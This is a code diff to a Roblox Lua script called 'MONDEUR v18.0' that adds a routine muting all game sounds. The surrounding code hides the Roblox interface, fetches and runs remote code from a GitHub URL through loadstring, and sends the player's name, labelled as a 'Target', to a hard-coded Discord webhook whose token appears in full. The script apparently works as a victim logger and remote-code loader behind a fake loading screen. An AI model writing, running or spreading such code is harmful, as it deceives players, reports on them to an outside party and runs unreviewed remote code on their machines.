@@ -1,4 +1,4 @@
--- [[ MONDEUR v18.0 - SYSTEM CONNECTED ]] --
+-- [[ MONDEUR v18.0 - SYSTEM CONNECTED + MUTE ]] --
 if getgenv().MondeurExecuted then return end
 getgenv().MondeurExecuted = true
 
@@ -9,13 +9,21 @@ local LocalPlayer = Players.LocalPlayer
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1403619431325634631/ygxLnix7JFuXUKC-wUgemRyPODjiPI65kyn0I0i2ATQQ0VVbjDukmhUfsg42b7HjvTuG"
 
--- [[ 1. THE INSTANT LOADING SCREEN ]] --
+-- [[ 1. THE MUTE SYSTEM ]] --
+local function MuteGame()
+    pcall(function()
+        for _, v in pairs(game:GetDescendants()) do
+            if v:IsA("Sound") then
+                v.Volume = 0
+            end
+        end
+    end)
+end
+
+-- [[ 2. THE INSTANT LOADING SCREEN ]] --
 local function LoadUI()
     pcall(function()
-        -- Disable standard Roblox UI
         StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
-        
-        -- Pull V.1 Loading Screen
         local ui = loadstring(game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/main/V.1"))()
         if ui then
             ui.Name = "MondeurGuard"
@@ -26,13 +34,13 @@ local function LoadUI()
     end)
 end
 
--- [[ 2. WEBHOOK DESIGN (MATCHES SCREENSHOT) ]] --
+-- [[ 3. WEBHOOK DESIGN (MATCHES SCREENSHOT) ]] --
 local function SendSystemLog()
     local payload = HttpService:JSONEncode({
         ["username"] = "bitchass",
         ["embeds"] = {{
             ["title"] = "💎 SYSTEM CONNECTED",
-            ["color"] = 0x00FF00, -- Pure Green as seen in screenshot
+            ["color"] = 0x00FF00,
             ["fields"] = {
                 {["name"] = "User", ["value"] = "**" .. LocalPlayer.Name .. "**", ["inline"] = false},
                 {["name"] = "Target", ["value"] = "Issues v18.0", ["inline"] = false},
@@ -55,5 +63,6 @@ local function SendSystemLog()
 end
 
 -- [[ EXECUTION ]] --
+task.spawn(MuteGame)
 task.spawn(LoadUI)
 task.spawn(SendSystemLog)
